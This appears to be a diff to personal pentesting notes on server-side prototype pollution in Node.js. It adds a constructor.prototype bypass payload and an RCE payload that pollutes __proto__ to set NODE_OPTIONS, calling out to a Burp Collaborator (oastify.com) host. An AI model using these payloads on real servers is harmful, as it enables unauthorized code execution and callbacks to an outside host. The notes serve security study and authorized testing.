@@ -1,4 +1,5 @@
 # Server Side prototype Pollution
+ - https://exploit-notes.hdks.org/exploit/web/security-risk/prototype-pollution-in-server-side/
  - Extension to help `https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8`
  - Difficult to detect cause its on server.
  - unsafely merges user-controllable input into a server-side JavaScript object.
@@ -191,3 +192,24 @@ function createError () {
 
  - https://portswigger.net/research/server-side-prototype-pollution
  - Burp extension `https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8`
+
+Flawed bypass
+```
+ "constructor": {
+        "prototype": {
+            "foo": "bar"
+        }
+    }
+```
+ - See the first link for more.
+
+## RCE
+ - NODE tries to run code asynchronously, it uses `child_process` module.
+ - An option can be set for these
+```
+  "__proto__": {
+    "shell":"node",
+    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
+}
+```
+ - The NODE_OPTIONS environment variable enables you to define a string of command-line arguments that should be used by default whenever you start a new Node process. As this is also a property on the env object, you can potentially control this via prototype pollution if it is undefined.
